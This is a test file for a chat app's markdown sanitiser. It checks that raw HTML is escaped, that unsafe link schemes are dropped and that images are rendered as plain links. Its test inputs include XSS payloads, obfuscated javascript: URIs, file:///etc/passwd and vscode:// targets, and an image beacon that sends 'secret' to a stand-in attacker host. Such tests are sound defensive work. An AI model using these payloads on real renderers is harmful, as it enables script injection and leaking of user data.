import { describe, expect, it } from 'vitest'
import { marked } from 'marked'
import { escapeHtml, safeHref, safeHtml, safeLink } from './markdown-safety'

// The same overrides streaming-markdown.svelte installs.
function render(md: string): string {
  const renderer = new marked.Renderer()
  renderer.html = ({ text }) => safeHtml(text)
  renderer.link = ({ href, title, tokens }) =>
    safeLink(href, title, renderer.parser.parseInline(tokens))
  renderer.image = ({ href, title, text }) =>
    safeLink(href, title, escapeHtml(text || href))
  return marked.parse(md, { renderer, async: false, gfm: true }) as string
}

describe('markdown safety', () => {
  it('shows raw HTML as text', () => {
    const out = render('hi <img src=x onerror="alert(1)"> there')
    expect(out).not.toContain('<img')
    expect(out).toContain('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;')
    const block = render('<script>alert(1)</script>\n\ntext')
    expect(block).not.toContain('<script')
  })

  it('keeps bare formatting tags', () => {
    expect(render('a<br>b <sub>2</sub>')).toContain('a<br>b <sub>2</sub>')
    expect(render('<b onclick="x()">bold</b>')).toContain('&lt;b onclick')
  })

  it('drops unsafe link targets', () => {
    for (const href of [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      'java\tscript:alert(1)',
      ' javascript:alert(1)',
      'java\nscript:alert(1)',
      '\u0001javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'command:workbench.action.terminal.sendSequence',
      'vscode://file/etc/passwd',
      'file:///etc/passwd',
    ]) {
      expect(safeHref(href)).toBeNull()
    }
    const out = render('[click](javascript:alert(1))')
    expect(out).not.toContain('href')
    expect(out).toContain('click')
  })

  it('keeps web, mail, anchor and relative links', () => {
    expect(safeHref('https://legalese.com/l4')).toBe('https://legalese.com/l4')
    expect(safeHref('mailto:a@b.c')).toBe('mailto:a@b.c')
    expect(safeHref('#section')).toBe('#section')
    expect(safeHref('docs/a b.md')).toBe('docs/a%20b.md')
    expect(render('[l4](https://legalese.com/l4 "Docs")')).toContain(
      '<a href="https://legalese.com/l4" title="Docs">l4</a>'
    )
  })

  it('escapes entities so the browser sees the checked target', () => {
    const out = render('[x](&#106;avascript:alert(1))')
    expect(out).not.toMatch(/href="&#106;/)
  })

  it('renders images as links, never as <img>', () => {
    const out = render('![chart](https://evil.example/beacon?d=secret)')
    expect(out).not.toContain('<img')
    expect(out).toContain(
      '<a href="https://evil.example/beacon?d=secret">chart</a>'
    )
    expect(render('![x](javascript:alert(1))')).not.toContain('href')
  })
})
